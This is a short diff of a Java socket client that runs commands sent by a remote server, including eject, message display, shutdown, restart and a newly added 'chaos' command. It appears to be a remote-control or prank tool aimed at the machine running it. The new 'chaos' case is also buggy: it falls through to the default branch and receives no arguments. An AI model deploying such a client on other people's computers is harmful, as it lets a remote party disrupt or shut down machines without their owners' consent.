@@ -52,8 +52,10 @@ public class Client
         while(socket.isConnected())
         {
             String serverCommand = inFromServer.readLine(); // blocks
-            if(serverCommand.equals("msg") || serverCommand.equals("sound")) // known commands that take an extra arg
+            if(serverCommand.equals("sound")) // known commands that take an arg
                 processServerCommand(serverCommand, inFromServer.readLine());
+            else if(serverCommand.equals("msg"))
+                processServerCommand(serverCommand, inFromServer.readLine(), inFromServer.readLine(), inFromServer.readLine());
             else
                 processServerCommand(serverCommand);
             System.out.println("Recivied from server: " + serverCommand);
@@ -67,7 +69,7 @@ public class Client
      */
     private void processServerCommand(String... serverCommand) throws IOException, AWTException
     {
-        switch(serverCommand[0])
+        switch(serverCommand[0].toLowerCase())
         {
             case "eject":
                 commandSet.eject();
@@ -90,7 +92,7 @@ public class Client
                 frame.setVisible(true);
                 return;
             case "msg":
-                commandSet.showMessage(serverCommand[1]);
+                commandSet.showMessage(serverCommand[1], serverCommand[2], serverCommand[3]);
                 return;
             case "shutdown":
                 commandSet.shutdown();
@@ -98,6 +100,8 @@ public class Client
             case "restart":
                 commandSet.restart();
                 return;
+            case "chaos":
+                commandSet.chaos(Long.valueOf(serverCommand[1]), Long.valueOf(serverCommand[2]));
             default:
                 System.out.println("Reached default in processSErverCommand with cmd: " + serverCommand);
         }
